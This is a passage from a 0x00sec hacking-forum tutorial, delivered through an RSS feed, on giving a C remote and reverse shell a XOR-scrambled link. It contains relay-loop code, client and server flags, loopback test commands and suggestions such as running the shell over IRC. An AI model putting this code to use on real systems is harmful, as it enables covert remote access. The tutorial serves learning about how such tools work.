+<p>The timeout is specified with a <code>struct timeval</code> type that gives us microseconds resolution. In our case we have set the timeout to 1 second.</p>
+<p>At this point we can call select and wait for the data to come.</p>
+<h2>Processing the data</h2>
+<p><code>select</code> tell us that we have got something in some of the file descriptors in our set, but we have to find out which one actually received the data. Again, let’s repeat the relevant code here for convenience.</p>
+<pre><code class="lang-auto">	  if (FD_ISSET(s, &amp;rfds))
+	    {
+	      memset (buffer, 0, 1024);
+	      if ((len = read (s, buffer, 1024)) &lt;= 0) 	exit (1);
+	      memfrob (buffer, len);
+
+	      write (s1, buffer, len);
+	    }
+	  if (FD_ISSET(s1, &amp;rfds))
+	    {
+	      memset (buffer, 0, 1024);
+	      if ((len = read (s1, buffer, 1024)) &lt;= 0) exit (1);
+
+	      memfrob (buffer, len);
+	      write (s, buffer, len);
+	    }
+</code></pre>
+<p>In the general case you will have a loop to check every file descriptor in your set. In this case we only have 2 so a couple of if will do the trick. Think about it as a loop <a href="https://en.wikipedia.org/wiki/Loop_unrolling" rel="noopener nofollow ugc">unrolling optimization</a> :). Yes, all right, we can make the if block into a function… But… I have to leave something for you to try <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"> (actually there is a reason for this but it is out of scope at this point)</p>
+<p>So, if we get data in our network socket, we just read the data, decrypt it and resend it to our shell. If we get data from our shell, we read it, we crypt it and we send it back to the network client.</p>
+<p>That’s it. The <code>memfrob</code> function does a XOR crypting with key (<a href="https://en.wikipedia.org/wiki/The_Hitchhiker's_Guide_to_the_Galaxy_%28novel%29" rel="noopener nofollow ugc">42</a>). The greatest thing about XOR crypting is that the same function can be used for crypt and decrypt. Other than that, with a 1 byte long key (42 in this case) it is pretty useless.</p>
+<h2>A Secure Client</h2>
+<p>OK, now we have a way to receive and send crypt data from/to our shell. We need a counterpart to our program that can deal with this crypt data. No problem, we just need to make a small change to our main function, and we will be done.</p>
+<p>The new <code>main</code> function looks like this:</p>
+<pre><code class="lang-auto">int
+main (int argc, char *argv[])
+{
+  /* FIXME: Check command-line arguments */
+  if (argv[1][0] == 'c')
+    secure_shell (client_init (argv[2], atoi(argv[3])));
+  else if (argv[1][0] == 's')
+    secure_shell (server_init (atoi(argv[2])));
+  else if (argv[1][0] == 'a')
+    async_read (client_init (argv[2], atoi(argv[3])), 0);
+  else if (argv[1][0] == 'b')
+    async_read (server_init (atoi(argv[2])), 0);
+		  
+  return 0;
+}
+</code></pre>
+<p>We exploit the fact that everything on UNIX is a file descriptor. Using file descriptor 0 (that is the standard input or <code>stdin</code>), and our <code>async_read</code> function we get automatically a working secure client.</p>
+<p>Using that trick, two additional flags had been added to launch the application as a client for direct and reverse remote shell access.</p>
+<h2>Testing again</h2>
+<p>Now, you already know how to compile your program so, let’s go straight to test our secure remote shell.</p>
+<p>Open two terminals to run the shell and the client and also fire up your preferred sniffer. You may want to use wireshark and take advantage of its nice “Follow TCP Stream” feature. Now, start capturing traffic in the loopback interface.</p>
+<p>In one terminal type:</p>
+<pre><code class="lang-auto">$ ./rss s 5000
+</code></pre>
+<p>In the other terminal type</p>
+<pre><code class="lang-auto">$ ./rss a 127.0.0.1 5000
+</code></pre>
+<p>Everything will look like our original remote shell. Just type a couple of commands and then go back to wireshark and take a look to what was sent through the network… Sure, that is how a XOR crypted shell session looks like!</p>
+<h2>NEXT</h2>
+<p>For the time being, the NEXT step I leave it to you, appreciated reader. There is a bunch of things you can try with very little modification of this small program.</p>
+<ul>
+<li>Try to add a password to only allow authorized user access your remote shell</li>
+<li>Try to use a proper crypto algorithm…openssl somebody?</li>
+<li>Try to use a different communication protocol… what about using an IRC channel to access your remote shell</li>
+<li>Try to access special commands in the server and not just forward everything to the shell (this is a generalization of the first point)</li>
+</ul>
+<p>Let’s see what you come out with…</p>
+<p>As usual you can find all the source code at:</p>
+<aside class="onebox allowlistedgeneric">
+  <header class="source">
+      <img src="https://github.githubassets.com/favicons/favicon.svg" class="site-icon" width="32" height="32">
+      <a href="https://github.com/0x00pf/0x00sec_code" target="_blank" rel="noopener nofollow ugc">GitHub</a>
+  </header>
+  <article class="onebox-body">
+    <img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a35c2bf9477f702a5322cfd1c8f54353d79c1d16.png" class="thumbnail" width="" height="">
+
+<h3><a href="https://github.com/0x00pf/0x00sec_code" target="_blank" rel="noopener nofollow ugc">0x00pf/0x00sec_code</a></h3>
+
+<p>Code for my 0x00sec.org posts. Contribute to 0x00pf/0x00sec_code development by creating an account on GitHub.</p>
+
+
+  </article>
+  <div class="onebox-metadata">
+    
+    
+  </div>
+  <div style="clear: both"></div>
+</aside>
+
+<p>Happy Hacking!</p>
+          <p><a href="https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306/1</link>
+        <pubDate>Wed, 11 May 2016 18:25:06 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-306-1</guid>
+        <source url="https://0x00sec.org/t/remote-shells-part-ii-crypt-your-link/306.rss">Remote Shells. Part II. Crypt your link</source>
+      </item>
+  </channel>
+</rss>
